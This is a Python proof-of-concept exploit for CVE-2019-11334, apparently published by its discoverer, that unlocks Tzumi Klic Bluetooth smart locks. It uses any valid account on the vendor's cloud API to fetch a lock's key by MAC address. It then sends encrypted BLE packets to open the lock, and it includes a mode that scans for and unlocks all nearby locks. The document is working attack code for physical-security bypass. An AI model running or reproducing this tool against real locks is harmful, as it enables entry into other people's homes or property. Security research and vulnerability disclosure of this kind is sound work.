# CVE-2019-11334
# MIT License
# Copyright (c) 2019 Kerry Enfinger
# Python program to unlock any Tzumi Klic smart locks Model 5686 Firmware 6.2 
# May work on other smart locks
# Requires valid account email and password from Klic mobile application

import argparse
import requests
import json
from subprocess import call
from bluepy.btle import Scanner
from bluepy.btle import Peripheral
from bluepy.btle import DefaultDelegate
from bluepy.btle import UUID
from Crypto.Cipher import AES

NOTIFICATION = ""

class KlicDelegate(DefaultDelegate):

    def __init__(self, key):
	DefaultDelegate.__init__(self)
        self.aes_key = key

    def decrypt(self, payload):
        aes = AES.new(self.aes_key, AES.MODE_ECB)
        decrypted = aes.decrypt(payload)
        return decrypted.encode('hex')

    def handleNotification(self, handle, data):
        global NOTIFICATION
        NOTIFICATION = self.decrypt(data)
                
class Klic:

    def __init__(self):
        self.lockKey=""
        self.mac = ""
        self.lockPwd = "000000"
        self.aes_key = ""
        self.token = ""
        self.userId = ""
        self.url = "http://app.nokelock.com:8080/"
        self.ext_get_token = "/newNokelock/user/loginByPassword"
        self.ext_get_lock_list = "/newNokelock/lock/getLockList"
        self.ext_query_device = "/newNokelock/lock/queryDevice"
        self.headers = {'token': 'None', 'clientType': 'Android', 'language': 'en-US', 'phoneModel': 'Nexus 5', 'osVersion': '7.1.2', 'appVersion': '1.0.9', 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'okhttp/3.11.0'}

        
    def set_aes_key(self, lockKey):
        hexkey = [lockKey[i:i+2] for i in range(0, len(lockKey), 2)]
        hexkey = [int(i) for i in hexkey]
        hexkey = ["{:02x}".format(x) for x in hexkey]
        hexkey = ''.join(hexkey)
        self.aes_key = str(bytearray.fromhex(hexkey))

    def parse_lock_key(self, lock_key):
        temp_key = lock_key.encode("utf-8")
        temp_key = [x.strip() for x in temp_key.split(',')]
        new_key = ""
        for i in temp_key:
            new_key = new_key + i.zfill(2)
        return new_key
        
    def get_token(self, account_str, password_str):
        data = {'account': account_str, 'code': password_str, 'type': '0'}
        response = requests.post(self.url + self.ext_get_token, data=json.dumps(data), headers=self.headers)
        json_resp = response.json()
        result = json_resp['result']
        return result['token'], result['userId']
	
    def get_lock_keys(self, account_str, password_str):
        self.token, self.userId = self.get_token(account_str, password_str)
        data = {'userId': self.userId}
        self.headers['token'] = self.token
        response = requests.post(self.url + self.ext_get_lock_list, data=json.dumps(data), headers=self.headers)
        json_resp = response.json()
        result = json_resp['result']
        lock_key = result[0]['lockKey']
        self.lockKey = self.parse_lock_key(lock_key)
        self.lockPwd = result[0]['lockPwd']
        self.mac = result[0]['mac']

    def get_lock_keys_by_mac(self, account_str, password_str, mac_addr):
        self.token, self.userId = self.get_token(account_str, password_str)
        data = {'mac': mac_addr}
        self.headers['token'] = self.token
        response = requests.post(self.url + self.ext_query_device, data=json.dumps(data), headers=self.headers)
        json_resp = response.json()
        result = json_resp['result']
        lock_key = result['lockKey']
        self.lockKey = self.parse_lock_key(lock_key)
        self.lockPwd = result['lockPwd']
        self.mac = result['mac']
        print(self.lockKey)
        print(self.lockPwd)
        print(self.mac)

    def scan(self, timeout=5):
        scanner = Scanner()
        sec = timeout
        dev_list = []
        print("Scanning for %s seconds" % sec)
        devs = scanner.scan(sec)
        for dev in devs:
            localname = dev.getValueText(9)
            if localname and localname.startswith("BS01"):
                print("Device found:")
                dev_list.append(dev.addr)
                print("  %s (%s), rssi=%d" % (dev.addr, localname, dev.rssi)) 
        return dev_list

    def encrypt(self, payload):
	    while len(payload) < 16:
	        payload += "\x00"
	    aes = AES.new(self.aes_key, AES.MODE_ECB)
	    return aes.encrypt(payload)

    def unlock_with_key(self, lock_key, mac_addr):
        self.lockKey = lock_key
        self.mac = mac_addr
        self.unlockKlic()

    def unlock_with_account(self, account, password):
        self.get_lock_keys(account, password)
        self.unlockKlic()

    def unlock_with_mac(self, account, password, mac):
        self.get_lock_keys_by_mac(account, password, mac)
        self.unlockKlic()

    def unlockKlic(self):	
        print("lockKey: " + self.lockKey)
        print("lockPwd: " + self.lockPwd)
        print("mac: " + self.mac)
        print("")

        # Convert lockKey to hex
        self.set_aes_key(self.lockKey)

        # Connect to klic lock
        klic = Peripheral(self.mac, "public")
	    klic.setDelegate(KlicDelegate(self.aes_key))

        # Setup to turn notifications on
        setup_data = b"\x01\x00"
        notify = klic.getCharacteristics( uuid='000036f5-0000-1000-8000-00805f9b34fb' )[0]
        notify_handle = notify.getHandle() + 1
        klic.writeCharacteristic(notify_handle, setup_data, withResponse=True)

	    # Send get token packet
        c = klic.getCharacteristics( uuid='000036f5-0000-1000-8000-00805f9b34fb' )[0]
        payload = self.encrypt("\x06\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        c.write(payload)
        print("Sent get token packet!")
        # Waiting for notification
        while True:
            if klic.waitForNotifications(1.0):
                # handleNotification() was called
                print("Got Notification: " + NOTIFICATION)
                hexkey = [NOTIFICATION[i:i+2] for i in range(0, len(NOTIFICATION), 2)]
                if hexkey[0] == '06' and hexkey[1] == '02':
                    break
                continue
        print("")
		
        # Send get battery packet
        c = klic.getCharacteristics( uuid='000036f5-0000-1000-8000-00805f9b34fb' )[0]
        payload = self.encrypt("\x02\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        c.write(payload)
        print("Sent get battery packet!")
		# Waiting for notification
        while True:
            if klic.waitForNotifications(1.0):
                # handleNotification() was called
                print("Got Notification: " + NOTIFICATION)
                hexkey = [NOTIFICATION[i:i+2] for i in range(0, len(NOTIFICATION), 2)]
                if hexkey[0] == '02' and hexkey[1] == '02':
                    break
                continue
        print("")

        # Send open lock packet
        c = klic.getCharacteristics( uuid='000036f5-0000-1000-8000-00805f9b34fb' )[0]
        payload = self.encrypt("\x05\x01\x06\x30\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00")
        c.write(payload)
        print("Sent open lock packet!")
        while True:
            if klic.waitForNotifications(1.0):
                # handleNotification() was called
                print("Got Notification: " + NOTIFICATION + "\n")
                break
        print("Lock should be unlocked!\n\n")

if __name__ == "__main__":
    print('[*] KlicUnlock v1.0.0')
    print('[*] Author: Kerry Enfinger\n')
	print('[*] CVE-2019-11334\n')

    parser = argparse.ArgumentParser(description='Klic Lock unlocking program.')
    parser.add_argument('-a', '--account', help='email address used when signing into app', type=str)
    parser.add_argument('-p', '--password', help='password used when signing into app', type=str)
    parser.add_argument('-k', '--key', help='key for lock (if known)', type=str)
    parser.add_argument('-m', '--mac', help='mac address for lock (if known)', type=str)
    parser.add_argument('-s', '--scan', help='scan for all nearby Klic locks', action='store_true')
    parser.add_argument('-u', '--unlock_all', help='scan for and unlock all nearby Klic locks', action='store_true')
    args = parser.parse_args()

    # Bring up bluetooth adapter and service - hci# may need to be changed for your individual needs
    call(["hciconfig", "hci0", "up"])
    call(["service", "bluetooth", "start"])

    if args.account and args.password and args.unlock_all is False:
        k = Klic()
        k.unlock_with_account(args.account, args.password)
    elif args.account and args.password and args.unlock_all is True:
        k = Klic()
        lock_list = k.scan()
        for lock in lock_list:
            print(args.account)
            print(args.password)
            print(lock.upper())
            k.unlock_with_mac(args.account, args.password, lock.upper())
    elif args.key and args.mac:
        k = Klic()
        k.unlock_with_key(args.key, args.mac) 
    elif args.scan:
        k = Klic()
        k.scan()
    else:
        print('You need to input account/password or key/mac combination')
        print('[*] Examples:')
        print('[*] python KlicUnlock.py -a myaccount@example.com -p mypassword')
        print('[*] python KlicUnlock.py -a myaccount@example.com -p mypassword -u')
        print('[*] python KlicUnlock.py -k 99999999999999999999999999999999 -m 01:02:03:04:05:06')
   
    
